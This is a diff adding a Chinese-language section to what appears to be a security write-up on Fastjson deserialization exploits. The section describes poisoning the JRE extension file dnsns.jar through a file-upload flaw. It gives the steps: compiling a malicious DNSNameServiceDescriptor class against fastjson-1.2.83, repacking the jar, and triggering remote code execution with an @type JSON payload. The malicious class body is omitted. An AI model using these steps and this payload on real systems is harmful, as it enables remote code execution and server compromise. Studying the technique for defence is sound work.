@@ -167,4 +167,42 @@ print(response.text)
 
 <img width="1055" height="683" alt="image" src="https://github.com/user-attachments/assets/be2918f0-8d96-4956-8f06-d9060b8658f6" />
 
+## dnsns.jar
 
+`dnsns.jar`也是位于jre/lib/ext路径下的文件，其核心原理与 `nashorn.jar` 类似：通过文件上传漏洞替换或污染这个扩展包中的类，再通过 Fastjson 反序列化触发该类的setter，从而实现 RCE。
+
+由于利用方式相同，这里就不再过多赘述了，讲一下构造步骤即可
+
+**构造步骤**
+
+1.备份并解压正常的dnsns.jar包，位于JAVA_HOME/jre/lib/ext/
+
+2.在dnsns\sun\net\spi\nameservice\dns\下创建DNSNameServiceDescriptor.java
+
+3.将fastjson-1.2.83.jar和正常的dnsns.jar包放在解压出来的dnsns目录下，用于编译DNSNameServiceDescriptor.java
+
+```
+dnsns
+	--sun
+	--META-INF
+	--fastjson-1.2.83.jar
+	--dnsns.jar
+```
+
+4.编译DNSNameServiceDescriptor.java
+
+```cmd
+javac -cp "fastjson-1.2.83.jar" sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.java
+```
+
+5.将恶意Shell.class重新打包进dnsns.jar
+
+```java
+jar -uvf dnsns.jar sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.class
+```
+
+最后同样fastjson触发
+
+```json
+{"@type":"sun.net.spi.nameservice.dns.DNSNameServiceDescriptor","javaCode":"xxx"}
+```
